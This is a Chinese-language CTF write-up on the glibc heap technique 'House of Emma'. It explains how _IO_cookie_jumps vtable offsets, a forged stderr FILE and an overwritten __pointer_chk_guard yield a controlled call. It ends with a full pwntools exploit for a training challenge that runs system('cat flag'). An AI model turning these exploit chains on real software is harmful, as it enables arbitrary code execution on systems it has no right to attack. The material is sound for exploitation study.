# House of emma

## 0x00 条件

1.可以任意写一个可控地址（LargeBin Attack、Tcache Stashing Unlink Attack…）

2.可以触发 IO 流（FSOP、[House OF Kiwi](https://www.anquanke.com/post/id/235598)）

## 0x01 原理

在 vtable 的合法范围内，存在一个 _IO_cookie_jumps：

```c++
static const struct _IO_jump_t _IO_cookie_jumps libio_vtable = {
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_file_finish),
  JUMP_INIT(overflow, _IO_file_overflow),
  JUMP_INIT(underflow, _IO_file_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_default_pbackfail),
  JUMP_INIT(xsputn, _IO_file_xsputn),
  JUMP_INIT(xsgetn, _IO_default_xsgetn),
  JUMP_INIT(seekoff, _IO_cookie_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_file_setbuf),
  JUMP_INIT(sync, _IO_file_sync),
  JUMP_INIT(doallocate, _IO_file_doallocate),
  JUMP_INIT(read, _IO_cookie_read),
  JUMP_INIT(write, _IO_cookie_write),
  JUMP_INIT(seek, _IO_cookie_seek),
  JUMP_INIT(close, _IO_cookie_close),
  JUMP_INIT(stat, _IO_default_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue),
};
```

在一个iofile结构体中，对 vtable 的检测中对虚表具体位置的检测还是比较宽松的，这使得我们可以在一定的范围内对 vtable 表的起始位置进行偏移，使其我们在调用具体偏移是固定的情况下，可以通过偏移来调用在 vtable 表中的任意函数，因此我们考虑可以将其指定为`_IO_cookie_read;_IO_cookie_write;_IO_cookie_seek;_IO_cookie_close   `

例如，由于最后的触发需要依靠[House OF Kiwi](https://www.anquanke.com/post/id/235598)，所以我们修改stderr的iofile结构体中的`_IO_file_jumps`为

`io_cookie_jumps+0x40`，这样最终就会调用`_IO_cookie_write`

同时`_IO_cookie_write`函数的参数就是这个iofile结构体，对应寄存器的值我们都可以控制

所以我们可以把其当做一个类似于 __free_hook 的 Hook 来利用。

具体伪造的stderr结构体一般可以是：

```python
target = libc_base+libc.sym['system']
io_cookie_jumps = 0x1e1a20+libc_base 
next_chain = 0

fake_IO_FILE = p64(0x00000000fbad2087)+3 * p64(0)
fake_IO_FILE += p64(0)  # _IO_write_base = 0
fake_IO_FILE += p64(0xffffffffffffffff)  # _IO_write_ptr = 0xffffffffffffffff
fake_IO_FILE += p64(0)
fake_IO_FILE += p64(0)  # _IO_buf_base
fake_IO_FILE += p64(0)  # _IO_buf_end
fake_IO_FILE += p64(0)*4
fake_IO_FILE += p64(next_chain)  # _chain
fake_IO_FILE += p64(0)*3
fake_IO_FILE += p64(libc_base+0x1e3660)  # _lock = writable address
fake_IO_FILE += p64(0)*7
fake_IO_FILE += p64(0)  # _mode = 0
fake_IO_FILE += p64(0)
fake_IO_FILE += p64(io_cookie_jumps + 0x40)  # vtable
fake_IO_FILE += p64(heap_base+0x300)  # rdi
fake_IO_FILE += p64(0)
fake_IO_FILE += p64(ROL(target^(heap_base+0xb30),0x11))
```

不过最终调用的函数指针会被PTR_DEMANGLE加密保护，绕过的方法就是利用LargeBin Attack等技巧直接覆盖ld中的密钥key的值为一个固定的堆地址

PTR_DEMANGLE具体的解密过程为：目标地址循环右移（ROR）11位，之后和ld中的__pointer_chk_guard 异或

所以我们的加密为先和__pointer_chk_guard 异或运算，再循环左移11位。

````python
def ROL(content, key):
    tmp = bin(content)[2:].rjust(64, '0')
    return int(tmp[key:] + tmp[:key], 2)

target = ROL(target^(heap_base+0xb30 = ),0x11)
# heap_base+0xb30 = __pointer_chk_guard 
````

而其中__pointer_chk_guard 的地址泄露可以利用gdb的字符串搜索寻找在anon段上的位置，他和libc的偏移一般固定，如果远程并不固定，也就是倒数第4位和第5位不同，我们可以选择爆破1/256来寻找,

主要的寻找原理是LargeBin Attack去覆盖，如果偏移不对则我们想修改的位置会不可写而报错

一般选用爆破出来的最高的地址

````python
for x in range(0x10):
    for y in range(0x10):
        try:
            libc_base = 0x1234
            offset = 0x6 << 20  # 倒数第6位
            offset += x << 16   # 倒数第5位
            offset += y << 12   # 倒数第4位
            target = libc_base + offset + low_3_bytes
            log.success("try offset:\t" + hex(offset + low_3_bytes))
            # your code
            p.interactive()
        except EOFError:
            p.close()
````

不过如果程序开启了沙盒没法直接运行system，可以考虑执行下面这个gadget来实现SROP：

````assembly
mov rdx, qword ptr [rdi + 8]; 
mov qword ptr [rsp], rax; 
call qword ptr [rdx + 0x20];
````

这样就可以利用setcontext+61来栈迁移执行orw读出flag，具体可以参考[第七届“湖湘杯” House _OF _Emma | 设计思路与解析 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/260614#h3-9)

## 0x02 例题

Dest0g3 520迎新赛 - emma

>  2.33版本的uaf，add edit show free, 但是最小申请0x417大小的chunk

首先是通过负的idx来修改stderr结构体的指针

之后[LargeBin Attack](https://blog.csdn.net/weixin_46483787/article/details/122754809?spm=1001.2014.3001.5501)来修改__pointer_chk_guard 

之后伪造stderr来修改vtable到`io_cookie_jumps+0x40`，rdi 为字符串“cat flag”的地址，rip为system地址

之后修改topchunk触发house of kiwi来得到flag

````python
# -*- coding: utf-8 -*-
from pwn import *
context(os='linux',arch='amd64')
context.log_level = 'debug'

# # 爆破tls
# for x in range(0x10-9):
#     for y in range(0x10):
#         try:
#             p = remote("node4.buuoj.cn","26229")
#             ELF_NAME = './pwn'
#             # p = process(ELF_NAME)
#             REMOTE_LIBC = '/lib/x86_64-linux-gnu/libc.so.6'

#             local = 0

#             LIBC_NAME = REMOTE_LIBC

#             elf = ELF(ELF_NAME)   
#             libc = ELF(LIBC_NAME) 

#             def debug(p,cmd=0):
#                 if local!=0:
#                     gdb.attach(p)
#                     if cmd:
#                         pause()
#                 else:
#                     pass

#             def cmd(i):
#                 p.sendlineafter(">>",str(i))

#             def add(idx,size,data):
#                 cmd(1)
#                 p.sendlineafter("Index:",str(idx))
#                 p.sendlineafter("Size:",str(size))
#                 p.sendlineafter("Content",data)

#             def edit(idx,data):
#                 cmd(2)
#                 p.sendlineafter("Index:",str(idx))
#                 p.sendlineafter("Content",data)

#             def edit_noline(idx,data):
#                 cmd(2)
#                 p.sendlineafter("Index:",str(idx))
#                 p.sendafter("Content",data)

#             def show(idx):
#                 cmd(3)
#                 p.sendlineafter("Index:",str(idx))

#             def delete(idx):
#                 cmd(4)
#                 p.sendlineafter("Index:",str(idx))

#             def ROL(content, key):
#                 tmp = bin(content)[2:].rjust(64, '0')
#                 return int(tmp[key:] + tmp[:key], 2)

#             add(0,0x460,"a"*0x40)
#             add(1,0x420,"b"*0x40)
#             add(2,0x440,"c"*0x40)
#             add(3,0x420,"d"*0x40)
#             # add(2,0x440,"c"*0x40)
#             delete(0)
#             edit_noline(0,'\x01')
#             show(0)
#             libc_base = (u64(p.recvuntil("\x7f").ljust(8,'\x00')) >> 16)-1-libc.sym['__malloc_hook']-0x10-96
#             print hex(libc_base)
#             edit_noline(0,'\x00')


#             add(4,0x470,"e"*0x40)
#             delete(2)
#             edit_noline(0,"a"*0x10)
#             show(0)
#             p.recvuntil("a"*0x10)
#             heap_addr = u64(p.recv(6).ljust(8,'\x00'))
#             print hex(heap_addr)
#             heap_base = heap_addr-0x290
#             global_max_fast = 0x1e3e78+libc_base
#             stderr_chain = 0x1e1648+libc_base

#             # ld_base = libc_base + 0x1fc000
#             # __pointer_chk_guard = ld_base + 0x32cf0
#             # print hex(__pointer_chk_guard)
#             # __pointer_chk_guard = libc_base+0x1ed5b0
#             # print hex(__pointer_chk_guard)

#             # debug(p)
#             # libc_base = 0x5b0
#             offset = 0x1 << 20
#             offset += (x+0xc) << 16
#             offset += y << 12
#             __pointer_chk_guard = libc_base + offset + 0x5b0
#             # log.success("try offset:\t" + hex(offset))


#             edit(0,p64(libc_base+0x1e1000)*2+p64(heap_addr)+p64(__pointer_chk_guard-0x20))
#             print hex(offset + 0x5b0)
#             add(5,0x480,"f"*0x40) # edit __pointer_chk_guard
#             log.success("__pointer_chk_guard offset:\t" + hex(offset + 0x5b0))
#             p.interactive()
#         except EOFError:
#             p.close()





ELF_NAME = './pwn'
REMOTE_LIBC = '/lib/x86_64-linux-gnu/libc.so.6'

local = 0

if local == 2:
    p = process(["/home/mark/glibc-all-in-one/2.29-0ubuntu2_amd64/ld-2.29.so", ELF_NAME],
            env={"LD_PRELOAD":"/home/mark/glibc-all-in-one/2.29-0ubuntu2_amd64/libc-2.29.so"})
elif local == 1:
    p = process(ELF_NAME)
    LIBC_NAME = REMOTE_LIBC
else:
    p = remote("node4.buuoj.cn","26229")
    LIBC_NAME = REMOTE_LIBC

elf = ELF(ELF_NAME)   
libc = ELF(LIBC_NAME) 

def debug(p,cmd=0):
    if local!=0:
        gdb.attach(p)
        if cmd:
            pause()
    else:
        pass

def cmd(i):
    p.sendlineafter(">>",str(i))

def add(idx,size,data):
    cmd(1)
    p.sendlineafter("Index:",str(idx))
    p.sendlineafter("Size:",str(size))
    p.sendlineafter("Content",data)

def edit(idx,data):
    cmd(2)
    p.sendlineafter("Index:",str(idx))
    p.sendlineafter("Content",data)

def edit_noline(idx,data):
    cmd(2)
    p.sendlineafter("Index:",str(idx))
    p.sendafter("Content",data)

def show(idx):
    cmd(3)
    p.sendlineafter("Index:",str(idx))

def delete(idx):
    cmd(4)
    p.sendlineafter("Index:",str(idx))

def ROL(content, key):
    tmp = bin(content)[2:].rjust(64, '0')
    return int(tmp[key:] + tmp[:key], 2)

add(0,0x460,"a"*0x40+p64(0)*4+"cat flag")
add(1,0x420,"b"*0x40)
add(2,0x440,"c"*0x40)
add(3,0x420,"d"*0x40)
# add(2,0x440,"c"*0x40)
delete(0)
edit_noline(0,'\x01')
show(0)
libc_base = (u64(p.recvuntil("\x7f").ljust(8,'\x00')) >> 16)-1-libc.sym['__malloc_hook']-0x10-96
print hex(libc_base)
edit_noline(0,'\x00')


add(4,0x470,"e"*0x40)
delete(2)
edit_noline(0,"a"*0x10)
show(0)
p.recvuntil("a"*0x10)
heap_addr = u64(p.recv(6).ljust(8,'\x00'))
print hex(heap_addr)
heap_base = heap_addr-0x290
global_max_fast = 0x1e3e78+libc_base
stderr_chain = 0x1e1648+libc_base

ld_base = libc_base + 0x1fc000
__pointer_chk_guard = ld_base + 0x32cf0
print hex(__pointer_chk_guard)
__pointer_chk_guard = libc_base+0x1ed5b0
print hex(__pointer_chk_guard)
# debug(p)


edit(0,p64(libc_base+0x1e1000)*2+p64(heap_addr)+p64(__pointer_chk_guard-0x20))

add(5,0x480,"f"*0x40) # edit __pointer_chk_guard



target = libc_base+libc.sym['system']

io_cookie_jumps = 0x1e1a20+libc_base 
next_chain = 0

fake_IO_FILE = p64(0x00000000fbad2087)+3 * p64(0)
fake_IO_FILE += p64(0)  # _IO_write_base = 0
fake_IO_FILE += p64(0xffffffffffffffff)  # _IO_write_ptr = 0xffffffffffffffff
fake_IO_FILE += p64(0)
fake_IO_FILE += p64(0)  # _IO_buf_base
fake_IO_FILE += p64(0)  # _IO_buf_end
fake_IO_FILE += p64(0)*4
fake_IO_FILE += p64(next_chain)  # _chain
fake_IO_FILE += p64(0)*3
fake_IO_FILE += p64(libc_base+0x1e3660)  # _lock = writable address
fake_IO_FILE += p64(0)*7
fake_IO_FILE += p64(0)  # _mode = 0
fake_IO_FILE += p64(0)
fake_IO_FILE += p64(io_cookie_jumps + 0x40)  # vtable
fake_IO_FILE += p64(heap_base+0x300)  # rdi
fake_IO_FILE += p64(0)
fake_IO_FILE += p64(ROL(target^(heap_base+0xb30),0x11))


add(-4,0x500,fake_IO_FILE)
# add(-1,0x500,fake_IO_FILE)
add(6,0x700,"6"*0x40)

delete(6)

add(7,0x500,"7"*0x40)

edit(6,'a'*0x508+p64(0x300))

print hex(__pointer_chk_guard)
debug(p)
add(8,0xff0,"8"*0x40)

debug(p)
p.interactive()
````

